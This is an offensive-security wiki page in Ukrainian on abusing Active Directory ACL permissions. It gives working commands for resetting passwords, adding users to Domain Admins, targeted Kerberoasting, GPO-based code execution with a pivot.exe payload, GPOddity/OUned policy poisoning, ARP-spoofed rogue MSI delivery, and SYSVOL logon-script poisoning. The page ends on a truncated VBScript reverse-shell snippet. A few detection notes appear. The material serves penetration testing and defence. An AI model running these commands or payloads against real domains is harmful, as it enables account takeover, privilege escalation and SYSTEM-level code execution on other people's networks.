# Зловживання ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка здебільшого містить стислий виклад методик із** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Докладніше дивіться в оригінальних статтях.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Про зловживання ACL видалених об’єктів і відновлення облікових записів див. [відновлення об’єктів із кошика AD](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls).

## **Права GenericAll для користувача**

Цей привілей надає зловмиснику повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl` зловмисник може:

- **Змінити пароль цілі**: за допомогою `net user <username> <password> /domain` зловмисник може скинути пароль користувача.
- У Linux це можна зробити так само через SAMR за допомогою Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Якщо обліковий запис вимкнено, очистіть прапорець UAC**: `GenericAll` дозволяє редагувати `userAccountControl`. У Linux BloodyAD може прибрати прапорець `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Призначте SPN обліковому запису користувача, щоб зробити його вразливим до Kerberoasting, а потім скористайтеся Rubeus і targetedKerberoast.py, щоб отримати хеші ticket-granting ticket (TGT) і спробувати їх зламати.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Вимкніть попередню автентифікацію для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Маючи `GenericAll` для користувача, можна додати облікові дані на основі сертифіката й автентифікуватися від його імені, не змінюючи його пароль. Див.:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Права GenericAll на групу**

Цей привілей дає зловмиснику змогу змінювати членство в групі, якщо він має права `GenericAll` для такої групи, як `Domain Admins`. Визначивши розрізнюване ім’я групи за допомогою `Get-NetGroup`, зловмисник може:

- **Додати себе до групи Domain Admins**: це можна зробити за допомогою прямих команд або модулів на кшталт Active Directory чи PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- З Linux ви також можете скористатися BloodyAD, щоб додати себе до довільних груп, якщо маєте права GenericAll/Write на їхнє членство. Якщо цільова група вкладена в «Remote Management Users», ви одразу отримаєте доступ через WinRM до хостів, які враховують цю групу:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Наявність цих привілеїв на об’єкті комп’ютера або обліковому записі користувача дає змогу:

- **Kerberos Resource-based Constrained Delegation**: Дає змогу захопити об’єкт комп’ютера.
- **Shadow Credentials**: Використати цю техніку, щоб видати себе за обліковий запис комп’ютера або користувача, скориставшись привілеями для створення shadow credentials.

## Переміщення об’єкта до OU з успадкованими дозволами

Шлях атаки може поєднувати **права на переміщення облікового запису** з **правами на запис, успадкованими від цільового OU**, навіть якщо жоден із принципалів спочатку не може змінювати чутливі атрибути облікового запису. Перевірте дозволи на переміщення вихідного об’єкта та `CreateChild` у цільовому OU, перемістіть об’єкт, а потім повторно перевірте його ефективний DACL. Наприклад, `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` у powerview.py переміщує користувача; після цього контрольована група з успадкованим `GenericWrite` на цьому OU може додати [shadow credential](shadow-credentials.md). Саме переміщення не створює успадкованого права.<sup>[[18]](#references)</sup>

Якщо у вас є `GenericAll` на OU, але немає відповідного успадкованого ACE, команда `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` може додати його для дочірніх об’єктів. Перевірте цільовий обліковий запис окремо: **для облікових записів, захищених AdminSDHolder, успадкування вимкнено**, тому ACE на OU може впливати на звичайних користувачів, але не діяти на захищеного користувача. Див. [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Окремий шлях зловживання можливий, коли привілейований скрипт періодичного очищення вибирає OU на основі ACE, на які може впливати зловмисник, а потім виконує для їхніх дочірніх об’єктів `Set-ADObject -Clear adminCount` **і** `$acl.SetAccessRuleProtection($False, $False)`. Якщо ви можете змінити DACL OU, надайте групі, яку перевіряє скрипт, потрібний ACE `ExtendedRight` або `GenericAll`; окремо перевірте, чи можете запустити завдання. Тоді привілейоване завдання може відновити успадкування для раніше захищеного облікового запису, дозволивши застосувати ACE OU. Перевірте точний скрипт, дозвіл на запуск і результівний DACL; саме лише очищення `adminCount` не вмикає успадкування, а SDProp може знову захистити облікові записи, які залишаються в захищених групах.<sup>[[18]](#references)</sup>

## **WriteProperty on Group**

Якщо користувач має права `WriteProperty` на всі об’єкти певної групи (наприклад, `Domain Admins`), він може:

- **Додати себе до групи Domain Admins**: Цього можна досягти, поєднавши команди `net user` і `Add-NetGroupUser`; цей спосіб дає змогу підвищити привілеї в домені.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Самостійне членство) у групі**

Цей привілей дає зловмисникам змогу додавати себе до певних груп, наприклад `Domain Admins`, за допомогою команд, що безпосередньо змінюють членство в групах. Щоб додати себе до групи, виконайте таку послідовність команд:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Подібна привілея дає змогу зловмисникам безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` для цих груп. Перевірка та використання цієї привілеї виконуються за допомогою:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Наявність права `ExtendedRight` для користувача `User-Force-Change-Password` дає змогу скидати пароль, не знаючи поточного пароля. Перевірити це право та скористатися ним можна через PowerShell або альтернативні інструменти командного рядка. Є кілька способів скинути пароль користувача, зокрема через інтерактивні сеанси та однорядкові команди для неінтерактивних середовищ. Команди варіюються від простих викликів PowerShell до використання `rpcclient` у Linux, демонструючи різноманітність векторів атак.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner над групою**

Якщо зловмисник виявить, що має права `WriteOwner` щодо групи, він може змінити власника групи на себе. Це особливо небезпечно, якщо йдеться про групу `Domain Admins`, оскільки зміна власника надає ширший контроль над атрибутами групи та її членством. Процес передбачає визначення потрібного об’єкта за допомогою `Get-ObjectAcl`, а потім зміну власника за допомогою `Set-DomainObjectOwner` — за SID або ім’ям.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite для користувача**

Цей дозвіл дає зловмиснику змогу змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях до сценарію входу користувача, щоб виконати шкідливий сценарій під час входу користувача в систему. Для цього команда `Set-ADObject` оновлює властивість `scriptpath` цільового користувача, вказуючи на сценарій зловмисника.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Вужчого ACE `WriteProperty`, обмеженого атрибутом [`scriptPath`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) користувача, може бути достатньо; `GenericWrite` не потрібен. Поєднайте це право на атрибут із доступним для запису скриптом у дереві `SYSVOL\<domain>\scripts` або `NETLOGON` домену, а потім оцініть, чи ймовірно, що цільовий користувач увійде в систему та запустить скрипт. Під час входу скрипт виконується в контексті цього користувача. Перевіряйте ефективні ACL AD і файлових ресурсів окремо; відповідний ACE `Allow` або сама лише доступна для запису директорія не підтверджують, що весь ланцюжок працюватиме.

## **GenericWrite on Group**

З цим привілеєм зловмисники можуть маніпулювати членством у групах, наприклад додавати до певних груп себе або інших користувачів. Для цього створюють об’єкт облікових даних, використовують його, щоб додавати користувачів до групи або видаляти їх, а потім перевіряють зміни членства за допомогою команд PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- З Linux Samba `net` може додавати/видаляти учасників, якщо у вас є `GenericWrite` для групи (корисно, коли PowerShell/RSAT недоступні):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Володіння об’єктом AD і наявність привілеїв `WriteDACL` для нього дають зловмиснику змогу надати собі привілеї `GenericAll` щодо цього об’єкта. Це виконується за допомогою маніпуляцій з ADSI, що дає повний контроль над об’єктом і змогу змінювати його членство в групах. Попри це, під час спроби скористатися цими привілеями за допомогою командлетів `Set-Acl` / `Get-Acl` модуля Active Directory існують обмеження.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Швидке захоплення через WriteDACL/WriteOwner (PowerView)

Якщо у вас є `WriteOwner` і `WriteDacl` для облікового запису користувача або служби, ви можете отримати повний контроль і скинути його пароль за допомогою PowerView, не знаючи старого пароля:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Примітки:
- Можливо, спершу потрібно буде змінити власника на себе, якщо у вас є лише `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Перевірте доступ через будь-який протокол (SMB/LDAP/RDP/WinRM) після скидання пароля.

## **Реплікація в домені (DCSync)**

Атака DCSync використовує певні дозволи на реплікацію в домені, щоб імітувати контролер домену та синхронізувати дані, зокрема облікові дані користувачів. Ця потужна техніка потребує таких дозволів, як `DS-Replication-Get-Changes`, що дає змогу зловмисникам витягувати конфіденційну інформацію із середовища AD без безпосереднього доступу до контролера домену.<sup>[[5]](#references)</sup> [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ до керування об’єктами групової політики (GPO) може створювати значні ризики для безпеки. Наприклад, якщо користувачеві на кшталт `offense\spotless` делеговано права керування GPO, він може мати такі привілеї, як **WriteProperty**, **WriteDacl** і **WriteOwner**. Цими дозволами можна зловживати зі шкідливою метою; це можна виявити за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Перелік дозволів GPO

Щоб виявити неправильно налаштовані GPO, можна об’єднати командлети PowerSploit. Це дає змогу знайти GPO, якими має право керувати певний користувач: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп’ютери, до яких застосовано певну політику**: можна визначити, до яких комп’ютерів застосовується певний GPO, щоб зрозуміти потенційний масштаб впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп’ютера**: щоб побачити, які політики застосовано до конкретного комп’ютера, можна скористатися командами на кшталт `Get-DomainGPO`.

**OU, до яких застосовано певну політику**: визначити організаційні підрозділи (OU), на які поширюється певна політика, можна за допомогою `Get-DomainOU`.

Також для переліку GPO та пошуку проблем у них можна скористатися інструментом [**GPOHound**](https://github.com/cogiceo/GPOHound).

### Зловживання GPO — New-GPOImmediateTask

Неправильно налаштованими GPO можна скористатися для виконання коду, наприклад, створивши негайне заплановане завдання. Це можна зробити, щоб додати користувача до локальної групи адміністраторів на вразливих комп’ютерах і значно підвищити привілеї:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### Модуль GroupPolicy — зловживання GPO

Модуль GroupPolicy, якщо його встановлено, дає змогу створювати й прив’язувати нові GPO, а також задавати параметри, наприклад значення реєстру для запуску бекдорів на вразливих комп’ютерах. Для цього методу потрібно оновити GPO, а користувач має ввійти на комп’ютер, щоб відбулося виконання:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Зловживання GPO

SharpGPOAbuse дає змогу зловживати наявними GPO, додаючи завдання або змінюючи параметри без створення нових GPO. Для цього інструменту потрібно змінити наявні GPO або скористатися інструментами RSAT, щоб створити нові, перш ніж застосовувати зміни:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Примусове оновлення політики

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб пришвидшити цей процес, особливо після внесення змін, на цільовому комп’ютері можна виконати команду `gpupdate /force`, щоб примусово запустити негайне оновлення політики. Ця команда гарантує, що всі зміни в GPO буде застосовано, не чекаючи наступного автоматичного циклу оновлення.

### Під капотом

Перевіривши Scheduled Tasks певної GPO, наприклад `Misconfigured Policy`, можна підтвердити наявність доданих завдань, як-от `evilTask`. Такі завдання створюються за допомогою скриптів або інструментів командного рядка, призначених для зміни поведінки системи або підвищення привілеїв.

Структура завдання, наведена у файлі конфігурації XML, створеному за допомогою `New-GPOImmediateTask`, описує параметри запланованого завдання, зокрема команду для виконання та тригери. Цей файл показує, як заплановані завдання визначаються та керуються в межах GPO, і дає змогу виконувати довільні команди або скрипти під час застосування політики.

### Користувачі та групи

GPO також дають змогу змінювати членство користувачів і груп у цільових системах. Безпосередньо редагуючи файли політик Users and Groups, зловмисники можуть додавати користувачів до привілейованих груп, наприклад до локальної групи `administrators`. Це можливо завдяки делегуванню дозволів на керування GPO, що дає змогу змінювати файли політик, додаючи користувачів або змінюючи членство в групах.

У файлі конфігурації XML для Users and Groups описано, як застосовуються ці зміни. Додаючи записи до цього файлу, можна надати певним користувачам підвищені привілеї в усіх системах, на які поширюється дія політики. Цей метод забезпечує прямий шлях до підвищення привілеїв через маніпуляції з GPO.

Для параметрів безпеки, як-от членство в локальних групах і права користувачів, також перевірте застосований шаблон GPO за шляхом `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` і ACL каталогу `SecEdit`. Доступний для запису каталог або файл — це привід для перевірки: чи визначають фактичний доступ до спільного ресурсу SYSVOL, заборонні та успадковані ACL, дозволи контейнера Group Policy, область дії політики й оновлення на клієнті, чи набуде зміна чинності. Саме членство в групі з назвою «GPO Managers» не підтверджує наявності прав на редагування. [Microsoft описує шлях до цього шаблону та розділення між контейнером Group Policy і шаблоном.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Також можна розглянути додаткові методи виконання коду або підтримання persistence, наприклад використання скриптів входу й виходу із системи, зміну ключів реєстру для autoruns, встановлення програмного забезпечення через файли .msi або редагування конфігурацій служб. Ці техніки дають різні способи зберегти доступ і контролювати цільові системи, зловживаючи GPO.

### Перенаправлення отримання GPC/GPT на автентифіковані шахрайські служби

GPO складається з LDAP-об’єкта **Group Policy Container (GPC)** з метаданими та розміщеного на SMB-ресурсі **Group Policy Template (GPT)** із файлами політики. Під час оновлення клієнт переходить за `gPLink` контейнера, зчитує відповідний GPC і його `gPCFileSysPath`, а потім завантажує GPT із цього UNC-шляху. Отже, доступ на запис до самого GPC або до `gPLink` OU, Site чи Domain можна використати для запуску обробки політик із привілеями.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Отруєння `gPCFileSysPath` за допомогою GPOddity

Якщо контрольований суб’єкт може записувати дані до цільового GPC (безпосередньо або через **NTLM relay до LDAP**), замініть `gPCFileSysPath` на UNC-шлях, розміщений зловмисником. [GPOddity](https://github.com/synacktiv/GPOddity) автоматизує зміну LDAP і розміщує шкідливий GPT із файлами політик на основі модулів або Immediate Task, яке клієнт Group Policy виконує від імені `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Анонімного SMB-ресурсу або ресурсу, що не залежить від облікових даних, недостатньо для сучасних клієнтів Windows: SMB Secure Negotiate вимагає підтвердження успішної автентифікації, тож шахрайська служба має перевірити доменну ідентичність, отримати ключ сеансу SMB і належним чином підписувати відповіді. У режимі embedded налаштуйте GPOddity за допомогою контрольованого облікового запису комп’ютера та його ключа служби, а потім виберіть корисне навантаження для комп’ютера або користувача в розділі `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Граничний випадок GPO для користувачів:** після MS16-072 Windows і далі створює дві SMB2-сесії в межах **одного TCP-з’єднання**: сесія користувача читає `GPT.INI`, а потім сесія облікового запису комп’ютера читає ефективну конфігурацію, як-от `ScheduledTasks.xml`. Тому шахрайський сервер має індексувати стан автентифікації, ключі сесій і ключі підпису за `SessionId` SMB2, а не лише за сокетом. Форк Scapy, вбудований у GPOddity/OUned, реалізує це через `SMBStreamSocketMultiplexing` і `SMBServer` з підтримкою мультиплексування; односесійні сервери Impacket/Scapy інакше повторно використовують неправильний стан підпису та не працюють із користувацькими політиками.<sup>[[15]](#references)</sup>

#### Отруєння `gPLink` за допомогою OUned

Маючи `WriteGPLink`, `GenericWrite` або еквівалентний контроль над OU, Site чи Domain, зловмисник може додати посилання, GPC DN якого обслуговується контрольованим зловмисником LDAP-хостом. Цей примітив уперше представив Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) автоматизує LDAP-запис і ланцюжок зі шкідливими GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Спершу жертва автентифікується на підробленому LDAP-сервісі й отримує GPC, у якого `gPCFileSysPath` вказує на підроблений SMB-сервіс; потім вона автентифікується на SMB і застосовує наданий GPT. Тому OUned потрібен обліковий запис із LDAP SPN, обліковий запис комп’ютера з HOST SPN для SMB (той самий обліковий запис комп’ютера може задовольнити обидві вимоги), а також DNS-резолюція або зворотне переспрямування, що скеровує порти 389 і 445 на хост оператора.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Вбудований LDAP-сервер Scapy в OUned перевіряє Kerberos/SPNEGO за допомогою справжнього ключа контрольованої служби та надає довільні дані GPC із JSON. Порожній ключ JSON моделює rootDSE, префікси `base64:` позначають двійкові значення, а сервер підтримує операції add/delete/modify/search і пошук типів `BASE`, `LEVEL` та `SUBTREE`; він може домовлятися про відсутність захисту, цілісність або конфіденційність. Завдяки цьому службу можна повторно використовувати, якщо інший компонент Windows переходить за контрольованим зловмисником посиланням LDAP, але вимагає автентифікований LDAP.<sup>[[15]](#references)</sup>

Не слід вважати, що синхронізація пароля облікового запису з фіктивним доменом відтворить усі ключі Kerberos: RC4 виводиться з пароля, тоді як AES string-to-key також використовує сіль, утворену з імені хоста/домену принципала. Передавання фактичного AES-ключа облікового запису в `KerberosSSP` дозволяє не примушувати RC4 за допомогою виявлюваної зміни `msDS-SupportedEncryptionTypes`, доступного для самостійного запису облікового запису комп’ютера.<sup>[[15]](#references)</sup>

#### Точки виявлення

Зіставляйте зміни `gPCFileSysPath` або `gPLink` зі змінами версій GPO та новими XML-файлами Immediate/Scheduled Task. Перевіряйте посилання на неочікувані контексти імен, UNC-хости поза затвердженим набором DC/SYSVOL, DNS-записи, що перенаправляють імена облікових записів комп’ютерів, квитки служб LDAP/CIFS для незвичних облікових записів комп’ютерів, а також зміни `msDS-SupportedEncryptionTypes`, які вмикають RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + перехоплення UNC-шляху (ARP spoofing)

`WriteGPLink` для OU/домену дає змогу змінити атрибут `gPLink` цільового контейнера та **примусово застосувати наявний GPO**, не редагуючи сам GPO. Це стає цікавим, коли зв’язаний GPO вже посилається на віддалений вміст через **UNC-шляхи** (`\\HOST\share\...`), оскільки автентифіковані користувачі можуть читати **SYSVOL** і шукати придатні для повторного використання політики офлайн.<sup>[[11]](#references)</sup>

Загальний алгоритм:

1. Використайте BloodHound, щоб знайти принципала з `WriteGPLink` для OU та перерахувати комп’ютери/користувачів у цій OU.
2. Створіть копію `SYSVOL` лише для читання та проаналізуйте GPO, шукаючи **Software Installation**, **зіставлення дисків** (`Drives.xml`) і **скрипти входу/запуску**, що містять посилання на UNC-шляхи.
3. Віддавайте перевагу політикам із посиланнями на **безпосереднє ім’я хоста** (наприклад, `\\DC02\share\pkg.msi`), а не на шляхи DFS/простору імен домену, оскільки шляхи на основі імені хоста легше перенаправити за допомогою L2 spoofing.
4. Додайте GUID вибраного GPO до `gPLink` цільової OU, щоб жертва обробила цю вже наявну політику.
5. У тому самому широкомовному сегменті виконайте ARP spoofing UNC-хоста та прив’яжіть його IP локально (`ip addr add <target_ip>/32 dev <iface>`), щоб SMB-трафік жертви надходив на ваш хост.
6. Надайте очікуваний шлях/ім’я файлу через SMB-сервер зловмисника (наприклад, `smbserver.py`) і дочекайтеся звичайної обробки політики.

Приклад збору `SYSVOL` і зіставлення GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Зв’яжіть наявний GPO із цільовим OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Якщо пов’язана GPO розгортає MSI з UNC-шляху, клієнт завантажить його під час **запуску комп’ютера** та встановить від імені **`NT AUTHORITY\SYSTEM`**. Підмінивши вказаний хост і розмістивши шкідливий MSI за **тим самим спільним ресурсом/шляхом/іменем**, можна перетворити `WriteGPLink` на виконання коду з правами SYSTEM **без змін у SYSVOL**.

Важливі обмеження:

- **Час має значення**: нове посилання з’явиться під час оновлення політики (зазвичай приблизно через 90 хвилин), але **Software Installation** зазвичай спрацьовує під час **перезавантаження**.
- Windows Installer зазвичай відстежує розгортання за допомогою **`ProductCode`** пакета. Якщо продукт уже встановлений, розгортання можуть пропустити.
- Щоб інсталятор не відхилив пакет, пропатчте шахрайський MSI так, щоб його **`ProductCode`** і **`PackageCode`** збігалися з кодами легітимного пакета, якого очікує GPO.
- Старі файли оголошень `.aas` можуть залишатися в `SYSVOL`, тому перед використанням перевірте, чи розгортання досі виглядає активним.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> захоплення NetNTLM / ретрансляція WebDAV

Зіставлення дисків GPP у `Drives.xml` змушують користувачів автентифікуватися на налаштованому UNC-шляху під час входу в систему або повторного підключення. Якщо підмінити вказаний хост, можна перехопити **NetNTLMv2**. Якщо навмисно спричинити збій SMB, Windows може повторити спробу через **WebDAV**, передавши **NTLM через HTTP**. Це значно полегшує ретрансляцію до **LDAP(S)**, **AD CS** або **SMB**.

#### Logon/startup script UNC hijack

Той самий підхід застосовується до скриптів, розміщених на UNC-шляху, які виявлено в `SYSVOL`:

- **Logon scripts** зазвичай виконуються в контексті **користувача**.
- **Startup scripts** зазвичай виконуються в контексті **комп’ютера / SYSTEM**.

Якщо шлях до скрипта вказує на хост із можливістю підміни, перенаправте UNC-хост і надайте змінений вміст скрипта з очікуваного розташування.

## Отруєння скриптів входу SYSVOL/NETLOGON

Шляхи з правом на запис у `\\<dc>\SYSVOL\<domain>\scripts\` або `\\<dc>\NETLOGON\` дають змогу змінювати скрипти входу, які запускаються під час входу користувача через GPO. Це забезпечує виконання коду в контексті безпеки користувачів, які входять у систему.

### Пошук скриптів входу
- Перевірте атрибути користувачів на наявність налаштованого скрипта входу:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Проскануйте спільні ресурси домену, щоб виявити ярлики або посилання на скрипти:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Аналізуйте файли `.lnk`, щоб визначати цілі, що вказують на SYSVOL/NETLOGON (корисний прийом DFIR і для зловмисників без прямого доступу до GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound відображає атрибут `scriptPath` об’єкта користувача, що вказує на logon script, якщо він заданий. Logon scripts, налаштовані через GPO, є окремим посиланням на політику, тому також перевірте відповідну GPO.

### Перевірте доступ на запис (не довіряйте перелікам спільних ресурсів)
Автоматизовані інструменти можуть показувати SYSVOL/NETLOGON як доступні лише для читання, навіть якщо для конкретного скрипту задано інший NTFS ACL. Спершу перевірте цей файл і його батьківський каталог без внесення змін; відповідні Allow ACEs залишаються можливими кандидатами, оскільки важливі ефективні дозволи SMB і NTFS, Deny ACEs та поточний токен:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Тест авторизованого запису має бути цільовим і зворотним: створіть резервну копію оригінального скрипту та відновіть його після тесту. Не перезаписуйте робочий скрипт входу лише для перевірки доступу: успішний запис може виконатися під час наступного входу користувача.

### Отруєння скрипту входу VBScript для RCE
Додайте команду, яка запускає PowerShell reverse shell (згенеруйте його на revshells.com), і збережіть оригінальну логіку, щоб не порушити роботу бізнес-функцій:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
